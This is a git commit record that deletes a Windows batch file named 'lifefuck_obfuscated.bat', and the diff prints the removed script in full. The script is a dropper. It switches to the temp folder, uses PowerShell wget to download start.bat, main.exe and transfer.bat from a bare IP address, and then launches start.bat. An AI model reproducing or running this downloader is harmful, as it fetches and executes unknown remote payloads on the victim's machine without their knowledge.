e5012aeb74c0b3d11dcc8576126219c32fbed539
Joseph Weaver <56514753+LTWeaver@users.noreply.github.com>
2023-11-15 15:49:23 +0000

    Delete lifefuck_obfuscated.bat

--- lifefuck_obfuscated.bat
+++
@@ -1,9 +0,0 @@
-ÿþ&cls
-@echo off
-
-cd %temp%
-powershell wget "http://143.42.5.48/start.bat" -O "start.bat"
-powershell wget "http://143.42.5.48/main.exe" -O "main.exe"
-powershell wget "http://143.42.5.48/transfer.bat" -O "transfer.bat"
-
-start start.bat
